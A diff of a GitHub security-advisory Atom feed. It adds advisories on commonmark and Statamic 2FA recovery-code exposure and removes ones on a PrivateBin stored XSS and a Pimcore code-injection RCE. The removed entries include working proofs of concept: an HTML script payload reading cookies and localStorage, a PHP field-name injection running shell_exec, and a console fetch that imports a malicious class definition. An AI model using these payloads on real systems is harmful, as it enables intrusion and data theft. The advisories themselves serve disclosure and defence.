+    if (\preg_match('/^' . RegexHelper::PARTIAL_ATTRIBUTENAME . '$/i', $name) !== 1) {
+        unset($attributes[$name]);
+        continue;
+    }
+
+    $attrNameLower = \strtolower($name);
+    // ... existing logic unchanged
+}
+</code></pre>
+<p>As defence in depth, <code>HtmlElement::__toString()</code> could validate or escape <code>$key</code>. It currently
+trusts its callers to supply safe attribute names, and <code>filterAttributes()</code> is the only thing
+standing between that method and user-supplied input.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/thephpleague/commonmark/security/advisories/GHSA-f8fg-pg57-v4j8">https://github.com/thephpleague/commonmark/security/advisories/GHSA-f8fg-pg57-v4j8</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/commit/dfcdf4554c16aa37c15e3a5ee3243ee26147c239">https://github.com/thephpleague/commonmark/commit/dfcdf4554c16aa37c15e3a5ee3243ee26147c239</a></li>
+<li><a href="https://github.com/thephpleague/commonmark/releases/tag/2.9.1">https://github.com/thephpleague/commonmark/releases/tag/2.9.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-f8fg-pg57-v4j8">https://github.com/advisories/GHSA-f8fg-pg57-v4j8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f8fg-pg57-v4j8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-01T20:18:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[statamic/cms] Statamic CMS exposes two-factor recovery codes through dynamic Antlers rendering]]></title>
+        <id>https://github.com/advisories/GHSA-jppw-r5j3-xf7x</id>
+        <link href="https://github.com/advisories/GHSA-jppw-r5j3-xf7x"/>
+        <updated>2026-09-01T19:56:32.000Z</updated>
+        <content type="html"><![CDATA[<p>Statamic CMS's user-augmentation resolver, AugmentedUser::get() in src/Auth/AugmentedUser.php, contains an explicit case for the <code>two_factor_recovery_codes</code> handle that returns the user's raw two-factor recovery codes with no access restriction: <code>if ($handle === 'two_factor_recovery_codes') { return new Value($this-&gt;data-&gt;get('two_factor_recovery_codes'), ...); }</code>. Unlike sensitive fields such as password/password_hash, which are excluded from AugmentedUser entirely, two_factor_recovery_codes is neither excluded from augmentation nor present in Statamic's Antlers variable guard lists (guardedVariablePatterns/guardedContentVariablePatterns in src/Providers/ViewServiceProvider.php, and the runtime GlobalRuntimeState guard paths), which by default only guard config.app.key. On any Antlers template field where raw/dynamic template rendering is enabled for a given field (an admin/developer-configured, blueprint-level field option), a template such as <code>{{ current_user.two_factor_recovery_codes }}{{ value }}|{{ /current_user.two_factor_recovery_codes }}</code> renders the viewing user's own 2FA recovery codes directly into the HTML response, allowing an attacker who can view or capture that response (e.g. via a shared/observable page, or a crafted link causing a victim to render it) to obtain the codes and bypass 2FA. Exploitation requires that dynamic Antlers rendering already be enabled on a field the target user's data flows through, which is a blueprint-configuration privilege rather than a standard content-editing permission.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71293">https://nvd.nist.gov/vuln/detail/CVE-2026-71293</a></li>
+<li><a href="https://github.com/statamic/cms">https://github.com/statamic/cms</a></li>
+<li><a href="https://github.com/statamic/cms/blob/master/src/Auth/AugmentedUser.php">https://github.com/statamic/cms/blob/master/src/Auth/AugmentedUser.php</a></li>
+<li><a href="https://github.com/advisories/GHSA-jppw-r5j3-xf7x">https://github.com/advisories/GHSA-jppw-r5j3-xf7x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jppw-r5j3-xf7x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-05T15:32:21.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[smarty/smarty] Smarty: SSRF via redirect bypass of trusted_uri using {fetch}]]></title>
         <id>https://github.com/advisories/GHSA-cq55-c7wv-pxmq</id>
@@ -714,955 +1117,5 @@ In general, PrivateBin would like to thank everyone reporting issues and potenti
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-08-28T20:25:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[privatebin/privatebin] PrivateBin has stored Cross-Side-Scripting (XSS) vulnerability in attachment download link via dangerous MIME types with required user-interaction]]></title>
-        <id>https://github.com/advisories/GHSA-f2xf-7x3g-4272</id>
-        <link href="https://github.com/advisories/GHSA-f2xf-7x3g-4272"/>
-        <updated>2026-08-28T20:23:00.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Stored cross-site scripting (XSS) in PrivateBin's attachment download link. An anonymous attacker can create a paste with a <strong>text/html</strong> attachment that, with certain user interaction, bypasses protections similar to CVE-2022-24833. When a victim opens the "Download attachment" link in a new tab, the attacker's inline JavaScript executes in the PrivateBin instance's origin with full same-origin capability (cookie/localStorage access, same-origin fetch).</p>
-<p>This is an incomplete fix of <a href="https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-cqcc-mm6x-vmvw">CVE-2022-24833</a>. The original fix only applies to the inline preview blob (in case of SVG), never to the download link's blob. Thus a <strong>text/html</strong> (or <strong>image/svg</strong>) attachment completely bypasses sanitization, re-enabling the exact attack class on instances that don't enforce the recommended Content-Security-Policy, but with a slightly different attack process.</p>
-<p>Instances using the default recommended CSP are protected (the blob inherits <strong>script-src 'self'</strong>, blocking inline scripts). The vulnerability affects instances where CSP is weakened, stripped, or absent, which is exactly the defense-in-depth scenario the CVE-2022-24833 fix was meant to cover.</p>
-<p>Requires <strong>fileupload = true</strong> (non-default) and a non-recommended CSP configuration.</p>
-<h3 id="details">Details</h3>
-<p>In <strong>js/privatebin.js</strong>, the function <strong>AttachmentViewer.setAttachment</strong> (line 2982) processes decrypted attachment data. Since PrivateBin uses zero-knowledge encryption, the entire decrypted message (including attachment content and MIME type) is attacker-controlled and can't be inspected or sanitized by the server.</p>
-<p><strong>Root cause 1: MIME-gated sanitization (line 3017)</strong></p>
-<p>DOMPurify sanitization only triggers when the MIME type matches <strong>/^image/.*svg/i</strong>. Any other active content type (such as <strong>text/html</strong>, <strong>application/xhtml+xml</strong>, <strong>text/xml</strong>) completely bypasses sanitization.</p>
-<pre><code class="language-js">// js/privatebin.js:3017-3023
-if (mimeType.match(/^image\/.*svg/i)) {          // only SVG is considered
-    const sanitizedData = DOMPurify.sanitize(
-        decodedData,
-        purifySvgConfig
-    );
-    blobUrl = getBlobUrl(sanitizedData, mimeType); // reassigns LOCAL variable only
-}
-</code></pre>
-<p><strong>Root cause 2: download link always points to unsanitized blob (line 3002)</strong></p>
-<p>The "Download attachment" link's <strong>href</strong> is set to the unsanitized blob URL at line 3002, before the SVG sanitization branch. The SVG branch (line 3022) only reassigns a local variable <strong>blobUrl</strong> that's consumed by the preview at line 3028. It never updates the download link. So even for SVG attachments, the download link carries unsanitized content.</p>
-<pre><code class="language-js">// js/privatebin.js:3001-3002
-let blobUrl = getBlobUrl(decodedData, mimeType);   // unsanitized blob
-attachmentLink.attr('href', blobUrl);              // download link set HERE (never updated)
-</code></pre>
-<p><strong>Root cause 3: MIME type is fully attacker-controlled</strong></p>
-<p>The MIME type is extracted from the decrypted data URI at line 3211-3217 via <strong>getAttachmentMimeType</strong>, which simply reads the substring between <strong>data:</strong> and <strong>;</strong> in the data URI. Since this value comes from the decrypted (attacker-created) payload, the attacker chooses whatever MIME type they want. The browser then creates a <strong>Blob</strong> with that exact <strong>Content-Type</strong> at line 2963-2967 via <strong>getBlobUrl</strong>.</p>
-<p><strong>Attack flow:</strong></p>
-<ol>
-<li>Attacker creates a paste with an attached <strong>.html</strong> file. The client encodes it as <strong>data:text/html;base64,...</strong> and encrypts it.</li>
-<li>Victim opens the paste URL. <strong>decryptPaste</strong> (line 5387-5397) decrypts the message and calls <strong>setAttachment</strong> with the attacker's data URI.</li>
-<li><strong>setAttachment</strong> creates a same-origin <strong>blob:<a href="http://instance/">http://instance/</a>...</strong> with <strong>Content-Type: text/html</strong> containing the attacker's HTML+script. This blob is assigned to the "Download attachment" link's <strong>href</strong> without any sanitization.</li>
-<li>Victim opens that link in a new tab (right-click, middle-click, or social-engineered left-click). The browser renders the blob as a full HTML document in the instance's origin, executing the attacker's inline JavaScript.</li>
-</ol>
-<p><strong>Relation to CVE-2022-24833:</strong></p>
-<p>The <a href="https://privatebin.info/reports/vulnerability-2022-04-09.html">2022 advisory</a> claimed: <em>"whether you open the SVG in a new tab or not and whether CSP is present and enabled or not does not matter any more, as the displayed SVG is sanitized."</em> This doesn't hold because:</p>
-<ul>
-<li>The download link's blob is never sanitized (only the preview blob is).</li>
-<li>The advisory's safety argument for the download link ("opens from file:// protocol") assumes the file is downloaded to disk. Opening the link in a new tab navigates to a same-origin <strong>blob:</strong> URL instead.</li>
-</ul>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p><strong>Environment:</strong></p>
-<ul>
-<li>PrivateBin commit <strong>597a6f0d</strong> (version 2.0.4+)</li>
-<li>PHP 8.x with built-in server</li>
-<li>Chromium-based browser (tested in Playwright/Chromium)</li>
-</ul>
-<p><strong>Step 1: Set up a vulnerable instance</strong></p>
-<pre><code class="language-bash">git clone https://github.com/PrivateBin/PrivateBin.git
-cd PrivateBin
-git checkout 597a6f0d
-mkdir -p data
-</code></pre>
-<p>Create <strong>cfg/conf.php</strong> with file upload enabled and a weakened CSP (simulating an instance where the recommended CSP isn't enforced, as documented in the original CVE-2022-24833 advisory).</p>
-<p>For example, here is a basic config:</p>
-<pre><code class="language-ini">[main]
-fileupload = true
-cspheader = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:; media-src * blob:; object-src * blob:"
-httpwarning = false
-
-[expire]
-default = "1week"
-
-[expire_options]
-5min = 300
-10min = 600
-1hour = 3600
-1day = 86400
-1week = 604800
-1month = 2592000
-1year = 31536000
-never = 0
-
-[formatter_options]
-plaintext = "Plain Text"
-syntaxhighlighting = "Source Code"
-markdown = "Markdown"
-
-[traffic]
-limit = 0
-
-[purge]
-limit = 300
-batchsize = 10
-
-[model]
-class = "Filesystem"
-
-[model_options]
-dir = "data"
-</code></pre>
-<p>Start the server:</p>
-<pre><code class="language-bash">php -S 127.0.0.1:8099
-</code></pre>
-<p><strong>Step 2: Prepare the payload file</strong></p>
-<p>Save as <strong>xss-attachment.html</strong>:</p>
-<pre><code class="language-html">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;&lt;title&gt;benign&lt;/title&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;h1&gt;just a harmless document&lt;/h1&gt;
-&lt;script&gt;
-  document.title = 'XSS:' + document.domain;
-  document.body.style.background = '#c00';
-  document.body.style.color = '#fff';
-  document.body.innerHTML = '&lt;h1&gt;XSS EXECUTED&lt;br&gt;origin = ' + location.origin +
-            '&lt;br&gt;protocol = ' + location.protocol +
-      '&lt;br&gt;cookies = ' + JSON.stringify(document.cookie) +
-      '&lt;br&gt;localStorage = ' + JSON.stringify(localStorage) + '&lt;/h1&gt;';
-  // prove same-origin capability
-  fetch(location.origin + '/?jsonld=paste', { credentials: 'include' })
-    .then(r =&gt; r.text())
-    .then(t =&gt; document.body.innerHTML += '&lt;pre&gt;same-origin fetch returned ' + t.length + ' bytes&lt;/pre&gt;');
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<img src="https://github.com/user-attachments/assets/bf918b75-a977-4df5-8d3f-6e2ffe238c85" alt="grafik" height="888" width="2217">
-
-<p>Optionally set some cookies and/or localstorage data in your browser console. (PrivateBin likely already has set at least a <code>lang</code> cookie.)</p>
-<p><strong>Step 3: Attacker creates the paste</strong></p>
-<ol>
-<li>Browse to <strong><a href="http://127.0.0.1:8099/">http://127.0.0.1:8099/</a></strong></li>
-<li>Type any text in the document area (e.g., "Quarterly report attached. Open the Download attachment link to view it.")</li>
-<li>Click <strong>Attach a file</strong> and select <strong>xss-attachment.html</strong>. The browser detects the file type as <strong>text/html</strong>, so the client produces <strong>attachment = ["data:text/html;base64,..."]</strong>.</li>
-<li>Click <strong>Create</strong>. Copy the resulting paste URL.</li>
-</ol>
-<p><strong>Step 4: Victim opens the paste</strong></p>
-<ol>
-<li>Open the paste URL in a browser. The paste decrypts and renders: "Download attachment (xss-attachment.html, ...)" with a <strong>blob:</strong> link.</li>
-<li>Right-click the "Download attachment" link and select <strong>Open in new tab</strong> (or middle-click).</li>
-</ol>
-<p><strong>Step 5: Observe XSS execution</strong></p>
-<p>The new tab opens at <strong>blob:<a href="http://127.0.0.1:8099/">http://127.0.0.1:8099/</a>...</strong> with:</p>
-<ul>
-<li>Page title: <strong>XSS:127.0.0.1</strong> (set by attacker script)</li>
-<li>Red background with <code>XSS EXECUTED, origin = http://127.0.0.1:8099, cookies = "", localstorage = ...</code> </li>
-<li>A same-origin fetch to the backend that returns real data (proving full origin access)</li>
-</ul>
-<img src="https://github.com/user-attachments/assets/b13678ac-6fba-4cb9-a7b5-ad2f9a12adc0" alt="grafik" height="856" width="2208">
-
-<p><strong>Negative control (default CSP):</strong></p>
-<p>Change <strong>cspheader</strong> in <strong>cfg/conf.php</strong> back to the recommended default:</p>
-<pre><code class="language-ini">cspheader = "default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:; sandbox allow-same-origin allow-scripts allow-forms allow-modals allow-downloads"
-</code></pre>
-<p>Restart the server and open the same paste. The blob navigation now inherits <strong>script-src 'self'</strong> from the page CSP, blocking inline script execution. The browser console shows: <em>"Executing inline script violates the following Content Security Policy directive 'script-src 'self' 'wasm-unsafe-eval''"</em>. The page title stays "benign" (script didn't run).</p>
-<h3 id="impact">Impact</h3>
-<p><strong>Who is impacted:</strong>
-Self-hosted PrivateBin instances that have <strong>both</strong>:</p>
-<ol>
-<li>File upload enabled (<strong>fileupload = true</strong>, default is <strong>false</strong>)</li>
-<li>A Content-Security-Policy that doesn't restrict inline scripts (the recommended CSP is weakened, stripped by a reverse proxy/CDN, or absent)</li>
-</ol>
-<p>The <a href="https://privatebin.info/reports/vulnerability-2022-04-09.html">CVE-2022-24833 advisory</a> documented that such instances exist in the wild. Instances using PrivateBin's default recommended CSP are <strong>not affected</strong>.</p>
-<p><strong>What can an attacker do:</strong></p>
-<ul>
-<li>Execute arbitrary JavaScript in the PrivateBin instance's web origin.</li>
-<li>Read <strong>localStorage</strong> and potentially other locally stored data (IndexDB, etc.) for that origin. </li>
-<li>Issue authenticated same-origin HTTP requests to the PrivateBin backend (which usually does not have any impact, as PrivateBin does not use traditional authentication methods) or any co-hosted application on the same domain.</li>
-</ul>
-<p><strong>What an attacker <em>cannot</em> do:</strong></p>
-<ul>
-<li>Exploit instances with the default recommended CSP (inline scripts are blocked in the blob).</li>
-<li>Exploit instances that don't have file upload enabled.</li>
-<li>Execute without victim interaction (the victim must open the attachment link in a new tab).</li>
-<li>Cookie access could <em>not</em> be confirmed (see screenshot above), as these seem to be <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#cross-origin_data_storage_access">separated differently</a>.</li>
-<li>Access to the opener via <strong>window.opener.document</strong> (same origin) could not be confirmed. (The link is just not opened via <code>window.open</code> or similar)</li>
-</ul>
-<p>That said, PrivateBin currently only stores user preferences (language, template, theme) in cookies or similar, so no authentication tokens or session data. Thus, similar to CVE-2022-24833, the practical risk exists for instances co-hosted with other applications.</p>
-<h2 id="patches">Patches</h2>
-<p>To fix the problem, we took the following measures:</p>
-<ul>
-<li>Except for a list of safe common mime types used for media (video/audio/PDF etc.) we overwrite the mime-type with <code>application/octet-stream</code> for the download link. This causes the browser to always download the file – even if the user triggered a „Open in new tab“ action – with the exception of the mentioned mime-types. This ensures HTML or any other potentially malicious file types (SVG, XML etc.) are never rendered, mitigating any XSS attacks.</li>
-</ul>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2026-06-11 – Received report via GitHub Security Advisory by the reporter.</li>
-<li>2026-06-11 – Report gets reviewed and discussed with the initial reporter.</li>
-<li>2026-06-13 – Vulnerability gets reproduced and patch is being developed.</li>
-<li>2026-06-14 – Patch gets reviewed.</li>
-<li>2026-06-1X – Patch gets merged</li>
-<li>2026-06-1X – New PrivateBin release is published.</li>
-<li>2026-06-XX – Vulnerability details published.</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>This vulnerability was reported by Rizky Muhammad, @EvidentObscurity, which we'd like to thank for that.
-In general, we'd like to thank everyone reporting issues and potential vulnerabilities to us.</p>
-<p>If you think you have found a vulnerability or potential security risk, <a href="https://github.com/PrivateBin/PrivateBin/blob/master/SECURITY.md">we'd kindly ask you to follow our security policy</a> and report it to us. We then assess the report and will take the actions we deem necessary to address it.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-f2xf-7x3g-4272">https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-f2xf-7x3g-4272</a></li>
-<li><a href="https://github.com/PrivateBin/PrivateBin/commit/e0dd4c025c19a182b6a4c6fb77a8bf81ceff6899">https://github.com/PrivateBin/PrivateBin/commit/e0dd4c025c19a182b6a4c6fb77a8bf81ceff6899</a></li>
-<li><a href="https://github.com/PrivateBin/PrivateBin/releases/tag/2.0.5">https://github.com/PrivateBin/PrivateBin/releases/tag/2.0.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-f2xf-7x3g-4272">https://github.com/advisories/GHSA-f2xf-7x3g-4272</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f2xf-7x3g-4272</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-28T20:22:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore Vulnerable to Remote Code Execution via DataObject Class-Definition Field Name]]></title>
-        <id>https://github.com/advisories/GHSA-9x44-4gxf-8c25</id>
-        <link href="https://github.com/advisories/GHSA-9x44-4gxf-8c25"/>
-        <updated>2026-08-28T19:17:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
-<p>A DataObject <strong>class-definition field name</strong> is concatenated, without an identifier allowlist, into the PHP class source that Pimcore generates for every DataObject class (<code>protected $&lt;fieldName&gt;;</code>). A user holding only the ordinary <code>objects</code> (DataObjects) permission can import a class definition whose field name closes the property and injects arbitrary PHP into the generated class file, achieving remote code execution on the server. The same unvalidated field name is also concatenated into ALTER TABLE DDL (<code>ADD COLUMN</code>/<code>ADD INDEX</code>), giving a parallel SQL-injection primitive. This is a sibling of CVE-2026-5394 (composite-index column SQL injection); that fix hardened only the <code>compositeIndices</code> sink and left the field-name path untouched.</p>
-<h2 id="impact">Impact</h2>
-<p>Any authenticated user with the <code>objects</code> permission — the standard permission for content editors who work with DataObjects, not an administrator or a dedicated "classes" permission — can:</p>
-<ol>
-<li><strong>Execute arbitrary PHP on the server (RCE).</strong> The injected code runs in the web application's PHP process when an object of the affected class is loaded (and is re-executed on every load), with full access to the application, its database credentials, secrets, and the host filesystem/OS — i.e. full server compromise.</li>
-<li><strong>Execute arbitrary ALTER TABLE DDL (SQL injection)</strong> against the DataObject store/query tables (drop columns, add indexes, corrupt schema).
-<strong>Confidence (read with the Reproduction section).</strong> The RCE sink — the real builder emitting attacker PHP into the generated class body, that class loading, and its <code>__construct()</code> executing a shell command — is <strong>runtime-confirmed in an isolated harness</strong> (see Reproduction → "Lab confirmation"). The remaining links of the end-to-end chain are <strong>reasoned from source but not yet run end-to-end on a live Pimcore</strong>: (a) the Studio import path (<code>generateLayoutTreeFromArray</code> → <code>save</code>) preserving the field name without transform/reject; (b) the persistent-field DDL step not aborting the save (addressed by the ≤64-byte gadget); and (c) Pimcore instantiating the object (<code>new</code>, e.g. via <code>DataObject::getById()</code>) so <code>__construct()</code> fires — autoloading alone executes only top-level class-body code, not the constructor. Treat the RCE as <strong>sink-confirmed + chain-reasoned</strong>, not as a fully-executed live exploit.</li>
-</ol>
-<p>Because the injected PHP executes with the privileges of the PHP runtime (typically the web-server user) and reaches the operating system — beyond the authority of the Pimcore application account the attacker started from — the scope is assessed Changed (<code>S:C</code>), consistent with Pimcore's own scoring of the analogous Custom-Reports SQL injection (GHSA-3234-gxc3-pq6f, <code>AV:N/AC:L/PR:L/UI:R/S:C</code>, 8.7); the result here is RCE rather than read-only SQLi, yielding <strong>9.9 Critical</strong>. <code>S:C</code> is the one debatable metric: a reviewer who scores the impact within the single PHP/OS authority as <code>S:U</code> lands at <code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code> = <strong>8.8 High</strong>. The severity floor is therefore High regardless of the scope interpretation.</p>
-<h2 id="technical-details">Technical Details</h2>
-<h3 id="source-→-sink-rce">Source → sink (RCE)</h3>
-<p>Pimcore generates a PHP class file for every DataObject class. The property block is built in <code>lib/DataObject/ClassBuilder/FieldDefinitionPropertiesBuilder.php</code>:</p>
-<p><code>php // lib/DataObject/ClassBuilder/FieldDefinitionPropertiesBuilder.php:27-32 foreach ($classDefinition-&gt;getFieldDefinitions() as $key =&gt; $def) { if (!$def instanceof ClassDefinition\Data\ReverseObjectRelation &amp;&amp; !$def instanceof ClassDefinition\Data\CalculatedValue) { $cd .= 'protected $'.$key.";\n";     // $key = field NAME, concatenated raw into PHP source } } </code></p>
-<p><code>$key</code> is the field name. The string is assembled into a class body in <code>lib/DataObject/ClassBuilder/ClassBuilder.php:104-112</code> (<code>class &lt;Name&gt; extends &lt;...&gt; {\n</code> + properties), written to <code>var/classes/DataObject/&lt;Class&gt;.php</code>, and autoloaded/included. A field name such as:</p>
-<p><code>poc; public function __construct(){ /* attacker PHP */ } private $z</code></p>
-<p>produces a valid class body containing an attacker-defined <code>__construct()</code> that executes when an object of the class is loaded.</p>
-<p>That the maintainers know name→PHP-generation requires an identifier allowlist is shown by the sibling <strong>enum-option</strong> generator, which does enforce one:</p>
-<p><code>php // lib/DataObject/ClassBuilder/SelectOptionsEnumBuilder.php:188 if (!preg_match('/^[A-Z-a-z_][A-Za-z0-9_]*$/', $selectOptionName)) { /* reject */ } </code></p>
-<p>The field-name path has no equivalent.</p>
-<h3 id="parallel-sql-injection-sink">Parallel SQL-injection sink</h3>
-<p>The same field name is concatenated, with backtick <strong>string</strong> quoting (not <code>quoteIdentifier</code>), into DDL:</p>
-<p><code>php // models/DataObject/ClassDefinition/Helper/Dao.php:102 (addModifyColumn — ADD COLUMN) $this-&gt;db-&gt;executeQuery('ALTER TABLE ' . $table . ' ADD COLUMN ' . $colName . ' ' . $type . ...); // :52/:67 (addIndexToField — ADD INDEX &lt;prefix&gt;&lt;name&gt; (&lt;name&gt;)) $this-&gt;db-&gt;executeQuery('ALTER TABLE ' . $table . ' ADD ' . $uniqueStr . 'INDEX ' . $prefix . $indexName . ' (' . $columnName . ');'); </code></p>
-<p>Source: <code>models/DataObject/ClassDefinition/Dao.php:228</code> → <code>$this-&gt;addModifyColumn($objectDatastoreTable, $key, $value-&gt;getColumnType(), '', 'NULL')</code>, <code>$key</code> = field name. A backtick in the field name breaks out of the quoted identifier.</p>
-<p>Contrast the patched composite-index sink, now guarded by an allowlist <strong>and</strong> <code>quoteIdentifier</code> (<code>models/DataObject/Traits/CompositeIndexTrait.php</code>).</p>
-<h3 id="why-validation-does-not-stop-it">Why validation does not stop it</h3>
-<p>The complete field-name validation across the import → save path:</p>
-<ol>
-<li><code>models/DataObject/ClassDefinition/Service.php:296</code> (<code>generateLayoutTreeFromArray</code>): <code>preg_match('/&lt;.+?&gt;/', $name)</code> — rejects only angle-bracket names. Backtick, <code>;</code>, <code>{}</code>, <code>()</code>, quotes, spaces all pass.</li>
-<li><ol start="2">
-<li><code>models/DataObject/ClassDefinition/Data.php:1292</code> (<code>isForbiddenName()</code>) — a reserved-word <strong>denylist</strong> (<code>in_array(strtolower($name), FORBIDDEN_NAMES)</code>), no character filtering.</li>
-</ol>
-</li>
-<li><ol start="3">
-<li><code>models/DataObject/ClassDefinition.php:1149</code> — validates the <strong>class</strong> name/id only.
-No allowlist is applied to field names. The Studio UI enforces an identifier pattern client-side; the API does not.</li>
-</ol>
-</li>
-</ol>
-<h3 id="reachability--privilege">Reachability / privilege</h3>
-<p>The HTTP entry point (<code>pimcore/studio-backend-bundle</code>):</p>
-<pre><code class="language-php">
-#[Route(self::ROUTE, name: 'pimcore_studio_api_class_definition_import', methods: ['POST'])] #[IsGranted(UserPermissions::DATA_OBJECTS-&gt;value)]      // UserPermissions::DATA_OBJECTS = 'objects' public function importClassDefinition(string $id, #[MapUploadedFile] UploadedFile $file): JsonResponse { return $this-&gt;jsonResponse( $this-&gt;classDefinitionService-&gt;importClassDefinitionFromJson($id, $file-&gt;getContent()) ); } ```
-
-`importClassDefinitionFromJson` → `ClassDefinitionRepository::importFromJson` → model `save()` → `saveClassInternal()`, which runs the DDL (`getDao()-&gt;save()`) and then the PHP class generation (`generateClassFilesInternal()`). The endpoint requires only the `objects` permission (`PR:L`) and performs no field-name validation of its own. The single authorization gate is the route-level `#[IsGranted('objects')]`; a DataObject **class definition** is global schema (not a workspace-scoped element), so no element-/workspace-level secondary authorization applies to the import — `objects` alone reaches the sink, which is what anchors `PR:L`. This is the same import endpoint used in the CVE-2026-5394 PoC.
-
-### Execution order
-
-In `saveClassInternal()`: field denylist check → class-name regex → `getDao()-&gt;save()` (DDL sink fires) → `generateClassFilesInternal()` (PHP-gen sink fires). The SQLi triggers first; the RCE payload either uses a non-persistent field type (no `ADD COLUMN`) or a ≤64-byte DDL-valid name so the DDL step does not abort before PHP generation.
-
-## Reproduction
-
-### Lab confirmation of the RCE sink (runtime, verified)
-
-Using the **unmodified** `FieldDefinitionPropertiesBuilder` source driven by a minimal `ClassDefinition` whose single field name is a PHP payload (full harness in the attached `rce_harness.php`):
-
-```php $maliciousName = 'pwn; public function __construct(){ echo "INJECTED-RCE-RAN: ".trim(shell_exec("id")); } private $z'; $cd = new ClassDefinition([$maliciousName =&gt; new \stdClass()], 'PwnDemo', '99'); $props = (new FieldDefinitionPropertiesBuilder())-&gt;buildProperties($cd); file_put_contents('/tmp/PwnDemo.php', "&lt;?php\nclass PwnDemo {\n".$props."}\n"); require '/tmp/PwnDemo.php'; new \PwnDemo(); ```
-
-Observed (`php:8.3-cli`):
-
-```text === generated properties block (real builder output) === protected $classId = "99"; protected $className = "PwnDemo"; protected $pwn; public function __construct(){ echo "INJECTED-RCE-RAN: ".trim(shell_exec("id")); } private $z; INJECTED-RCE-RAN: uid=0(root) gid=0(root) groups=0(root) ```
-
-The real builder emitted a class body containing the attacker's `__construct()`, and loading the class executed the injected command.
-
-### End-to-end PoC (browser console, against the Studio API)
-
-```js // Run in the browser DevTools console of an authenticated Pimcore Studio session // held by a user with the ordinary "objects" (DataObjects) permission. // NON-DESTRUCTIVE marker payload: writes a sentinel file.
-
-const CLASS_ID = "REPLACE_WITH_A_THROWAWAY_TEST_CLASS_ID";
-
-const fieldName = 'x;function __construct(){touch("/tmp/pimcore_rce_poc");}//';
-
-const def = { layoutDefinitions: { name: "pimcore_root", fieldtype: "panel", datatype: "layout", children: [ { name: fieldName, fieldtype: "input", datatype: "data", title: "poc" } ] } };
-
-const fd = new FormData(); fd.append("file", new Blob([JSON.stringify(def)], { type: "application/json" }), "import.json");
-
-fetch(`/pimcore-studio/api/class/definition/configuration-view/detail/${CLASS_ID}/import`, { method: "POST", credentials: "include", body: fd, }).then(r =&gt; r.json()).then(console.log); ```
-
-Steps:
-
-1. As a user with only the `objects` permission, create/own a throwaway DataObject class and note its id (`CLASS_ID`).
-2. 2. Open DevTools → Console and run the snippet above. Expected: a success JSON for the import (the class is regenerated).
-3. 3. Load any object of that class (open it in Studio, or request it) to autoload the regenerated `var/classes/DataObject/&lt;Class&gt;.php`.
-4. 4. Confirm `/tmp/pimcore_rce_poc` was created on the server — proving the field name executed as PHP.
-## Q0a / Q0b
-
-- **Q0a** (vendor accepted-risk): not by-design. The sibling enum-option generator enforces an identifier allowlist (`SelectOptionsEnumBuilder.php:188` `/^[A-Z-a-z_][A-Za-z0-9_]*$/`) and the composite-index fix added one — the field-name path simply lacks the equivalent. Source-verified: the only import-path field-name check is `Service.php:297` `preg_match('/&lt;.+?&gt;/', $name)` (angle-brackets only; `;{}()`, spaces, backtick all pass), and `FieldDefinitionPropertiesBuilder.php:30` concatenates the raw `$key` into `protected $&lt;name&gt;;`. No upstream allowlist gate exists. PASS.
-- **Q0b** (venue-routed dedup; venue = github-security-advisory): sibling/incomplete-coverage of CVE-2026-5394 / GHSA-r2f4-ff2p-xc64 (DataObject **composite-index** SQL injection), whose fix hardened only `CompositeIndexTrait`. The **field-name** → PHP-codegen RCE (`FieldDefinitionPropertiesBuilder`) and the field-name → ALTER TABLE DDL (`Helper/Dao.php`) are distinct, unfixed sinks. Not covered by GHSA-3234 (Custom Reports SQLi, different feature). Not a duplicate. CLEAR.
-- **Secondary sink noted:** `Service.php:517` also concatenates the raw field name into a generated PHP string literal (`public const FIELD_... = '&lt;name&gt;';`) — a second codegen-injection point (string-literal breakout via `'`), same root cause; the allowlist fix closes both.
-## Suggested Fix
-
